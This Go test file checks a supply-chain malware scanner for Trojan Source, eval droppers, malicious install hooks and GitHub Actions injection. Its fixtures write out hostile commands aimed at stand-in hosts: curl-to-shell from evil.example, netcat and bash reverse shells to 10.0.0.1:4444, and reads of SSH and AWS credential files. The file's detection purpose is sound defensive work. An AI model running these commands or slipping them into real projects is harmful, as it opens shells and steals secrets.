package supplychain_test

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/pc/backend-boilerplate-conformance-tests/internal/supplychain"
	"github.com/pc/backend-boilerplate-conformance-tests/internal/types"
)

func TestSupplyChainAndMalwareScanner(t *testing.T) {
	t.Run("Detects Trojan Source, Variation Selector steganography, obfuscated eval dropper, malicious postinstall, and GHA injection", func(t *testing.T) {
		tmp := t.TempDir()
		write := func(rel, content string) {
			p := filepath.Join(tmp, rel)
			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
				t.Fatal(err)
			}
		}

		// 1. Trojan Source bidi override U+202E + Variation Selector run U+FE00..U+FE05
		write("src/backdoor.ts", "const isAdmin = false; /* \u202e } \u2066if (isAdmin)\u2069 \u2066*/\nconst hidden = \"\ufe00\ufe01\ufe02\ufe03\ufe04\ufe05\";\n")
		// 2. Long base64 payload + eval dropper
		b64Payload := strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", 8) // > 240 chars
		write("src/dropper.ts", "import { exec } from 'node:child_process';\nconst blob = '"+b64Payload+"';\neval(Buffer.from(blob, 'base64').toString());\n")
		// 3. Pipe-to-shell in script
		write("scripts/bootstrap.sh", "#!/bin/sh\ncurl -fsSL https://evil.example/payload.sh | sh\n")
		// 4. Malicious postinstall + missing lockfile + cleartext http tarball in package.json
		write("package.json", `{
			"name": "poisoned-app",
			"scripts": { "postinstall": "node -e \"require('child_process').exec('nc -e /bin/sh 10.0.0.1 4444')\"" },
			"dependencies": { "sketchy": "http://evil.example/sketchy-1.0.0.tgz" }
		}`)
		// 5. GitHub Actions pull_request_target + expression injection + unpinned @main action
		write(".github/workflows/pr.yml", `on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: thirdparty/action@main
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "Title ${{ github.event.pull_request.title }}"
`)

		findings, err := supplychain.ScanRepository(tmp, types.LangTypeScript)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		var titles []string
		hasMalwareCritical := false
		for _, f := range findings {
			titles = append(titles, f.ID)
			if f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical {
				hasMalwareCritical = true
			}
		}
		if !hasMalwareCritical {
			t.Fatalf("expected critical CategoryMalware findings, got %+v", findings)
		}
		for _, wantSubstr := range []string{"trojan-source", "obfuscated-exec-dropper", "shell-dropper", "malicious-lifecycle-hook", "lockfile", "github-actions"} {
			matched := slices.ContainsFunc(titles, func(id string) bool { return strings.Contains(id, wantSubstr) })
			if !matched {
				t.Fatalf("expected finding matching %q in %v", wantSubstr, titles)
			}
		}
	})

	t.Run("Zero false positives on legitimate sha512 packageManager hashes, .gitleaks.toml allowlists, and pinned Elixir compile:false git tags", func(t *testing.T) {
		tsRepo := t.TempDir()
		sha512Hex := strings.Repeat("a1b2c3d4", 16)
		_ = os.WriteFile(filepath.Join(tsRepo, "package.json"), []byte(`{
			"name": "clean-nestjs",
			"scripts": { "build": "nest build", "prepare": "husky" },
			"packageManager": "pnpm@10.13.1+sha512.`+sha512Hex+`"
		}`), 0o644)
		_ = os.WriteFile(filepath.Join(tsRepo, "pnpm-lock.yaml"), []byte("lockfileVersion: '9.0'\npackages:\n  lodash@4.18.0:\n    resolution: {integrity: sha512-"+strings.Repeat("Z", 88)+"}\n"), 0o644)
		_ = os.WriteFile(filepath.Join(tsRepo, ".gitleaks.toml"), []byte("[allowlist]\npaths = ['''\\.env\\.example$''']\n"), 0o644)
		_ = os.WriteFile(filepath.Join(tsRepo, ".env.example"), []byte("JWT_KEY="+strings.Repeat("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A", 10)+"\n"), 0o644)
		_ = os.MkdirAll(filepath.Join(tsRepo, "src"), 0o755)
		_ = os.WriteFile(filepath.Join(tsRepo, "src/logo.ts"), []byte("export const icon = 'data:image/png;base64,"+strings.Repeat("AAAA", 80)+"';\n"), 0o644)

		findings, err := supplychain.ScanRepository(tsRepo, types.LangTypeScript)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings on clean TS repo, got %+v (err=%v)", findings, err)
		}

		exRepo := t.TempDir()
		_ = os.WriteFile(filepath.Join(exRepo, "mix.exs"), []byte(`defmodule CleanApp.MixProject do
  defp deps do
    [
      {:phoenix, "~> 1.8"},
      {:heroicons, github: "tailwindlabs/heroicons", tag: "v2.2.0", app: false, compile: false}
    ]
  end
end`), 0o644)
		_ = os.WriteFile(filepath.Join(exRepo, "mix.lock"), []byte(`%{"phoenix": {:hex, :phoenix, "1.8.0", "deadbeef"}}`), 0o644)

		exFindings, err := supplychain.ScanRepository(exRepo, types.LangElixir)
		if err != nil || len(exFindings) != 0 {
			t.Fatalf("expected 0 findings on clean Elixir repo with tag-pinned compile:false dep, got %+v (err=%v)", exFindings, err)
		}

		// Unpinned branch: "main" in mix.exs MUST fail
		_ = os.WriteFile(filepath.Join(exRepo, "mix.exs"), []byte(`defp deps, do: [{:bad_dep, github: "org/bad", branch: "main"}]`), 0o644)
		badExFindings, _ := supplychain.ScanRepository(exRepo, types.LangElixir)
		if len(badExFindings) == 0 {
			t.Fatalf("expected finding for floating branch: \"main\" git dependency in mix.exs")
		}
	})

	t.Run("Go zero-dependency module passes without go.sum while module with require fails without go.sum", func(t *testing.T) {
		zeroDepGo := t.TempDir()
		_ = os.WriteFile(filepath.Join(zeroDepGo, "go.mod"), []byte("module example.com/zero\n\ngo 1.23\n"), 0o644)
		findings, err := supplychain.ScanRepository(zeroDepGo, types.LangGo)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings on zero-dependency go.mod, got %+v (err=%v)", findings, err)
		}

		depGo := t.TempDir()
		_ = os.WriteFile(filepath.Join(depGo, "go.mod"), []byte("module example.com/withdep\n\ngo 1.23\n\nrequire github.com/pkg/errors v0.9.1\n"), 0o644)
		findings, err = supplychain.ScanRepository(depGo, types.LangGo)
		if err != nil || len(findings) == 0 {
			t.Fatalf("expected lockfile finding when go.mod has require without go.sum, got %+v (err=%v)", findings, err)
		}
	})

	t.Run("Detects missing package-lock.json integrity, Python setup.py hook, and hex-escaped dropper", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"app","dependencies":{"a":"1.0.0"}}`), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "package-lock.json"), []byte(`{
			"lockfileVersion": 3,
			"packages": {
				"": { "name": "app" },
				"node_modules/a": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz" }
			}
		}`), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "setup.py"), []byte("import subprocess\nsubprocess.Popen(['sh', '-c', 'curl http://evil | sh'])\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "pyproject.toml"), []byte("[project]\nname = \"app\"\ndependencies = [\"fastapi>=0.110\"]\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "payload.py"), []byte("data = \""+strings.Repeat("\\x41", 36)+"\"\n"), 0o644)

		findings, err := supplychain.ScanRepository(repo, types.LangPython)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		var ids []string
		for _, f := range findings {
			ids = append(ids, f.ID)
		}
		for _, want := range []string{"supplychain-lockfile-integrity", "supplychain-malicious-lifecycle-hook", "supplychain-suspicious-encoded-blob"} {
			if !slices.ContainsFunc(ids, func(id string) bool { return strings.Contains(id, want) }) {
				t.Fatalf("expected finding containing %q in %v", want, ids)
			}
		}
	})

	t.Run("Multiline .gitleaks.toml paths array with regex character classes does not prematurely terminate allowlist", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, ".gitleaks.toml"), []byte(`[allowlist]
paths = [
  '''src/[a-z]+/fixtures/.*''',
  '''\.env\.example$''',
]
`), 0o644)
		_ = os.MkdirAll(filepath.Join(repo, "src", "auth", "fixtures"), 0o755)
		longBlob := strings.Repeat("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A", 10)
		_ = os.WriteFile(filepath.Join(repo, "src", "auth", "fixtures", "cert.pem"), []byte(longBlob+"\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, ".env.example"), []byte("JWT_KEY="+longBlob+"\n"), 0o644)

		findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings when multiline .gitleaks.toml has regex character classes, got %+v (err=%v)", findings, err)
		}
	})

	t.Run("package-lock.json scan deterministically reports missing integrity and still detects http:// URLs on remaining packages", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"app","dependencies":{"a":"1.0.0","b":"1.0.0","z":"1.0.0"}}`), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "package-lock.json"), []byte(`{
			"lockfileVersion": 3,
			"packages": {
				"": { "name": "app" },
				"node_modules/a": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz" },
				"node_modules/b": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/b/-/b-1.0.0.tgz" },
				"node_modules/z": { "version": "1.0.0", "resolved": "http://evil.example/z-1.0.0.tgz", "integrity": "sha512-abc" }
			}
		}`), 0o644)

		for i := 0; i < 20; i++ {
			findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
			if err != nil {
				t.Fatalf("ScanRepository error: %v", err)
			}
			var foundHTTP, foundMissingA bool
			for _, f := range findings {
				if strings.Contains(f.Title, "Cleartext HTTP resolved URL") && strings.Contains(f.Title, "node_modules/z") {
					foundHTTP = true
				}
				if strings.Contains(f.Title, "Missing integrity hash") {
					if !strings.Contains(f.Title, "node_modules/a") {
						t.Fatalf("run %d: expected deterministic missing integrity report for node_modules/a, got %q", i, f.Title)
					}
					foundMissingA = true
				}
			}
			if !foundHTTP || !foundMissingA {
				t.Fatalf("run %d: expected both cleartext HTTP (node_modules/z) and missing integrity (node_modules/a) findings, got %+v", i, findings)
			}
		}
	})

	t.Run("Skips .superpowers directory, *_test.go and JS/TS test files, and does not self-match supplychain.go", func(t *testing.T) {
		repo := t.TempDir()
		write := func(rel, content string) {
			p := filepath.Join(repo, rel)
			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
				t.Fatal(err)
			}
		}

		// .superpowers artifacts must be ignored
		write(".superpowers/sdd/brief.md", "curl -fsSL https://evil.example/a.sh | sh\n")
		// Test files across Go and JS/TS must be skipped during source-text payload/exfil scans
		write("pkg/auth_test.go", "package auth\nconst bad = \"bash -i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
		write("src/auth.test.ts", "const cmd = 'curl https://evil.example/p.sh | sh';\n")
		write("src/auth.spec.ts", "const cmd = 'cat ~/.ssh/"+"id_rsa';\n")
		write("src/auth.test.js", "const cmd = 'cat ~/.aws/"+"credentials';\n")
		write("src/auth.spec.js", "const blob = '"+strings.Repeat("A", 260)+"';\n")

		// Include the real supplychain.go source itself to ensure zero self-matches
		selfSrc, err := os.ReadFile("supplychain.go")
		if err != nil {
			t.Fatalf("read supplychain.go: %v", err)
		}
		write("internal/supplychain/supplychain.go", string(selfSrc))

		findings, err := supplychain.ScanRepository(repo, types.LangGo)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		if len(findings) != 0 {
			t.Fatalf("expected 0 findings when scanning .superpowers, test files, and supplychain.go itself, got %+v", findings)
		}

		// Non-test production file in the same repo MUST still be flagged
		write("src/real.ts", "const cmd = 'curl https://evil.example/p.sh | sh';\n")
		prodFindings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
		if err != nil {
			t.Fatalf("ScanRepository prod error: %v", err)
		}
		if len(prodFindings) != 1 || prodFindings[0].ID != "malware-shell-dropper-or-exfil" {
			t.Fatalf("expected 1 malware-shell-dropper-or-exfil finding on src/real.ts, got %+v", prodFindings)
		}
	})

	t.Run("Trojan Source bidi runes are still caught in *_test.go while payload/exfil strings are skipped", func(t *testing.T) {
		repo := t.TempDir()
		if err := os.MkdirAll(filepath.Join(repo, "pkg"), 0o755); err != nil {
			t.Fatal(err)
		}
		content := "package pkg\n// \u202e } \u2066if (admin)\u2069 \u2066\nconst fixture = \"bash -i >& /dev/" + "tcp/10.0.0.1/4444\"\n"
		if err := os.WriteFile(filepath.Join(repo, "pkg", "auth_test.go"), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}

		findings, err := supplychain.ScanRepository(repo, types.LangGo)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		if len(findings) != 1 || findings[0].ID != "malware-trojan-source-unicode" || findings[0].FilePath != "pkg/auth_test.go" {
			t.Fatalf("expected exactly 1 malware-trojan-source-unicode finding on pkg/auth_test.go, got %+v", findings)
		}
	})

	t.Run("pyproject.toml http:// check skips # comment lines but flags active URLs", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, "pyproject.toml"), []byte("[project]\nname = \"app\"\n# docs: http://example.com/guide\ndependencies = [\"fastapi>=0.110\"]\n"), 0o644)
		_ = os.WriteFile(filepath.Join(repo, "uv.lock"), []byte("version = 1\n"), 0o644)

		findings, err := supplychain.ScanRepository(repo, types.LangPython)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings when http:// only appears in # comment, got %+v (err=%v)", findings, err)
		}

		_ = os.WriteFile(filepath.Join(repo, "pyproject.toml"), []byte("[project]\nname = \"app\"\n# docs: http://example.com/guide\ndependencies = [\"fastapi>=0.110\"]\n\n[[tool.uv.index]]\nurl = \"http://insecure.example/simple\"\n"), 0o644)
		findings, err = supplychain.ScanRepository(repo, types.LangPython)
		if err != nil || len(findings) != 1 || findings[0].ID != "supplychain-lockfile-integrity" || findings[0].FilePath != "pyproject.toml" || findings[0].Line != 7 {
			t.Fatalf("expected 1 supplychain-lockfile-integrity finding on line 7 of pyproject.toml, got %+v (err=%v)", findings, err)
		}
	})

	t.Run("scanGitHubWorkflows detects expression injection inside |+, >+, and run: | # comment blocks", func(t *testing.T) {
		repo := t.TempDir()
		wfDir := filepath.Join(repo, ".github", "workflows")
		if err := os.MkdirAll(wfDir, 0o755); err != nil {
			t.Fatal(err)
		}
		wf := `on: issues
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - name: keep-chomping-literal
        run: |+
          echo "${{ github.event.issue.title }}"
      - name: keep-chomping-folded
        run: >+
          echo "${{ github.event.issue.body }}"
      - name: literal-with-comment
        run: | # inline comment
          echo "${{ github.event.comment.body }}"
      - name: comment-only-not-block
        run: # comment only
        env:
          TITLE: ${{ github.event.issue.title }}
`
		if err := os.WriteFile(filepath.Join(wfDir, "triage.yml"), []byte(wf), 0o644); err != nil {
			t.Fatal(err)
		}

		findings, err := supplychain.ScanRepository(repo, types.LangGo)
		if err != nil {
			t.Fatalf("ScanRepository error: %v", err)
		}
		var ghaCount int
		for _, f := range findings {
			if f.ID == "supplychain-github-actions-injection" {
				ghaCount++
			}
		}
		if ghaCount != 3 {
			t.Fatalf("expected exactly 3 supplychain-github-actions-injection findings, got %d: %+v", ghaCount, findings)
		}
	})

	t.Run("Multiline triple-quoted TOML string in .gitleaks.toml paths with bracket and inline comment", func(t *testing.T) {
		repo := t.TempDir()
		_ = os.WriteFile(filepath.Join(repo, ".gitleaks.toml"), []byte(`[allowlist]
paths = [
  '''src/
  [a-z]+/fixtures/.*''', # inline comment
  '''\.env\.example$''',
]
`), 0o644)
		longBlob := strings.Repeat("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A", 10)
		_ = os.WriteFile(filepath.Join(repo, ".env.example"), []byte("JWT_KEY="+longBlob+"\n"), 0o644)

		findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
		if err != nil || len(findings) != 0 {
			t.Fatalf("expected 0 findings with multiline triple-quoted TOML path and inline comment, got %+v (err=%v)", findings, err)
		}
	})
}
